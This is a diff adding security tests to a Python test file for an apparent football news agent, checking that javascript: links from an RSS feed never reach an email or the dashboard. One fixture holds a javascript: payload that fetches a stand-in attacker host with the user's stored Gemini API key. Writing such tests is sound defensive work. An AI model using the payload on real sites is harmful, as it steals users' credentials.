@@ -104,6 +104,28 @@ flags = news.parse_flags(reply, PLAYERS, REAL_URLS)
 check("unknown severity falls back to low", flags and flags[0]["severity"] == "low", str(flags[:1]))
 check("concern truncated", flags and len(flags[0]["concern"]) <= 300)
 
+print("\na javascript: URL cannot travel from a feed to a rendered link")
+import knowledge
+feed = """<rss><channel><item>
+  <title>Haaland doubt</title>
+  <link>javascript:fetch('https://evil.test/'+localStorage.getItem('fpl_agent_gemini_key'))</link>
+  <description>x</description></item></channel></rss>"""
+items = knowledge.parse_feed(feed, "bridge")
+check("knowledge.py refuses a javascript: link at ingest",
+      items and items[0]["link"] == "", str(items))
+
+# Even if one somehow reached the flag, the email must not link it.
+html = render.render_news([{
+    "player": "Haaland", "team": "MCI", "concern": "doubt",
+    "severity": "high", "source": "javascript:alert(1)"}])
+check("email never renders a javascript: source", "javascript:" not in html)
+
+# And the dashboard's own guard, checked against its real source.
+dash = open("dashboard.html", encoding="utf-8").read()
+check("dashboard validates the scheme before building an href",
+      "safeUrl(n.source)" in dash and 'href="${esc(n.source)}"' not in dash)
+check("dashboard's safeUrl only accepts http(s)", "^https?:" in dash.replace("\\", ""))
+
 failed = [r for r in results if not r[1]]
 print(f"\n{len(results) - len(failed)}/{len(results)} passed")
 if failed:
